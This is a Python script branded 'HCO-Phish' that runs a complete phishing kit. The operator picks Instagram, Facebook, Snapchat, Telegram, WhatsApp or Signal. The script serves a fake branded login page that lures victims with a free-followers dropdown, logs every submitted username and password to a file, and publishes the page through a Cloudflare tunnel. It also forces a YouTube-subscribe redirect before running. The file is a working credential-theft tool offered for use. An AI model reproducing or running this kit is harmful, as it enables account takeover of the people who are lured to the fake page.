#!/usr/bin/env python3
# HCO-Phish – Single Service Realistic Dashboard with Colorful Branding

import os, sys, time, subprocess, threading, webbrowser, shutil, re
from colorama import Fore, init
from flask import Flask, render_template_string, request

init(autoreset=True)

# ------------------ Tool Lock & YouTube Redirect ------------------ #
def check_subscription():
    print(Fore.RED + "\n🔒 Tool is locked! Subscribe to unlock.\n")
    print(Fore.YELLOW + "Redirecting to Hackers Colony YouTube channel in:")
    for i in range(8,0,-1):
        print(Fore.CYAN + f"  {i}...", end="\r")
        time.sleep(1)
    print(Fore.GREEN + "\nOpening YouTube now...\n")
    try:
        subprocess.run(["termux-open-url","https://youtube.com/@hackers_colony_tech?si=pvdCWZggTIuGb0ya"])
    except:
        webbrowser.open("https://youtube.com/@hackers_colony_tech?si=pvdCWZggTIuGb0ya")
    input(Fore.GREEN + "Press Enter after subscribing to continue...")

# ------------------ Termux Menu ------------------ #
services=["Instagram","Facebook","Snapchat","Telegram","WhatsApp","Signal"]
colors={
    "Instagram":"#405DE6",
    "Facebook":"#1877f2",
    "Snapchat":"#fffc00",
    "Telegram":"#0088cc",
    "WhatsApp":"#25d366",
    "Signal":"#3a76f0"
}

choice=None
while choice not in [str(i) for i in range(1,len(services)+1)]:
    print(Fore.CYAN+"="*60)
    print(Fore.MAGENTA+"MENU — choose a template (enter number):")
    for idx,s in enumerate(services,1):
        print(Fore.YELLOW+f"{idx}) {s}")
    print(Fore.RED+"0) Exit")
    print(Fore.CYAN+"="*60)
    choice=input(Fore.GREEN+"Select (1-6): ").strip()
    if choice=="0": sys.exit(Fore.RED+"[!] Exiting...")

selected_service=services[int(choice)-1]
selected_color=colors[selected_service]
print(Fore.LIGHTMAGENTA_EX + f"[*] You selected: {selected_service}")

check_subscription()
print(Fore.CYAN + "[*] Starting local Flask server...")

# ------------------ Flask App ------------------ #
app=Flask(__name__)

# ------------------ HTML Template ------------------ #
dashboard_html=f"""
<!DOCTYPE html>
<html>
<head>
<title>{selected_service} Login</title>
<style>
body{{background:{selected_color};color:white;font-family:Arial;text-align:center;margin:0;padding:0;}}
header{{background:#0d47a1;color:red;font-size:36px;font-weight:bold;padding:25px;}}
input{{padding:10px;margin:5px;width:250px;border-radius:5px;border:none;font-size:16px;}}
select{{padding:10px;margin:5px;width:266px;border-radius:5px;border:none;font-size:16px;background:{selected_color};color:white;}}
button{{padding:10px;margin:5px;width:266px;border-radius:5px;border:none;font-size:16px;background:{selected_color};color:white;font-weight:bold;cursor:pointer;}}
button:hover{{opacity:0.9;}}
h1{{margin-top:30px;}}
</style>
</head>
<body>
<header>HCO Phish by Azhar</header>
<h1>{selected_service} Login</h1>
<form method="POST">
<select name="followers" required>
<option value="" disabled selected>Select followers</option>
<option value="100">100 followers</option>
<option value="1000">1000 followers</option>
<option value="10000">10000 followers</option>
</select><br>
<input type="text" name="username" placeholder="Username or Phone" required><br>
<input type="password" name="password" placeholder="Password" required><br>
<button type="submit">Login</button>
</form>
</body>
</html>
"""

@app.route("/", methods=["GET","POST"])
def dashboard():
    if request.method=="POST":
        username=request.form.get("username","")
        password=request.form.get("password","")
        followers=request.form.get("followers","N/A")
        print(Fore.LIGHTGREEN_EX+f"\n[+] {selected_service} Login Captured!")
        print(Fore.CYAN+f"Followers Selected: {followers}")
        print(Fore.YELLOW+f"Username: {username}")
        print(Fore.RED+f"Password: {password}\n")
        with open("simulation_log.txt","a") as f:
            f.write(f"[{selected_service}] Followers:{followers} {username}:{password}\n")
        return f"<h2>{selected_service} Login submitted successfully!</h2><a href='/'>Back</a>"
    return render_template_string(dashboard_html)

# ------------------ Cloudflare Tunnel ------------------ #
def start_cloudflared():
    if shutil.which("cloudflared") is None:
        print(Fore.RED + "[!] cloudflared not installed. Install using 'pkg install cloudflared'")
        return
    print(Fore.CYAN + "[*] Starting cloudflared tunnel...")
    proc=subprocess.Popen(
        ["cloudflared","tunnel","--url","http://127.0.0.1:5000"],
        stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True
    )
    while True:
        line=proc.stdout.readline()
        if line:
            print(Fore.LIGHTBLACK_EX+line.strip())
            match=re.search(r"https://[a-zA-Z0-9.-]+trycloudflare\.com",line)
            if match:
                url=match.group(0)
                print(Fore.LIGHTGREEN_EX + f"[*] Cloudflare Public URL: {url}")
                break

# ------------------ Run Flask ------------------ #
threading.Thread(target=start_cloudflared, daemon=True).start()
app.run(host="0.0.0.0", port=5000)
